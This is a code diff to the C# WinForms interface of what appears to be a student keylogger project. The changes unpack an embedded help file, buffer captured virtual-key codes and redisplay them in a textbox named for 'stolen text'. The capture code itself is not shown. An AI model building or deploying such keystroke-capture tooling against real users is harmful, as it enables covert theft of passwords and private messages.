@@ -1,10 +1,17 @@
-﻿using System;
+﻿/*
+ * Author: Serediuc Andrei-Gheorghe
+ * Date : 26.05.2024
+ */
+
+
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -16,12 +23,26 @@ namespace UIModule
     public partial class InterfataSimpla : Form
     {
         private LoggerWriter _log;
+        private String TempFile;
+        private int[] BufferCaractere = new int[5000];
+        private int NumarCaractere = 0;
         public InterfataSimpla(LoggerWriter log)
         {
-            InitializeComponent();
+            var assembly = Assembly.GetExecutingAssembly();
+            var resourceName = "UIModule.res.Key_Logger.chm";
+            // Create a temporary file to hold the embedded resource
+            TempFile = Path.Combine(Path.GetTempPath(), "Key_Logger.chm");
+            using (Stream resourceStream = assembly.GetManifestResourceStream(resourceName))
+            using (FileStream fileStream = new FileStream(TempFile, FileMode.Create, FileAccess.Write))
+            {
+                resourceStream.CopyTo(fileStream);  
+            }
+
+                InitializeComponent();
             _log = log;
             ModAfisare.DropDownStyle = ComboBoxStyle.DropDownList;
             TextFurat.ReadOnly = true;
+            ModAfisare.SelectedIndex = 0;
         }
 
         private void label1_Click(object sender, EventArgs e)
@@ -59,6 +80,11 @@ namespace UIModule
                         break;
                     }
             }
+            TextFurat.Text = "";
+            for (int i = 0; i < NumarCaractere; i++)
+            {
+                _log.HandleVK(BufferCaractere[i], "", TextFurat);
+            }
         }
 
         private void label3_Click(object sender, EventArgs e)
@@ -78,6 +104,8 @@ namespace UIModule
                     if (code != "")
                     {
                         int vkCode = Int16.Parse(code);
+                        BufferCaractere[NumarCaractere] = vkCode;
+                        NumarCaractere++;
                         _log.HandleVK(vkCode, "", TextFurat);
                     }
                 }
@@ -98,16 +126,26 @@ namespace UIModule
         private void Exit_Click(object sender, EventArgs e)
         {
 
-            string helpFilePath = Path.Combine(Application.StartupPath, "Key Logger.chm");
+            Help.ShowHelp(this, TempFile);
+            
 
-            if (File.Exists(helpFilePath))
-            {
-                Help.ShowHelp(this, helpFilePath);
-            }
-            else
-            {
-                MessageBox.Show("Fișierul de ajutor nu a fost găsit. Verificați calea specificată.\n"+ helpFilePath, "Eroare", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+        }
+
+        private void SocketDebug_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void ButonClear_Click(object sender, EventArgs e)
+        {
+            BufferCaractere = new int[5000];
+            NumarCaractere = 0;
+            TextFurat.Text = "";
+        }
+
+        private void ModAfisare_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            e.Handled = true;
         }
     }
 }
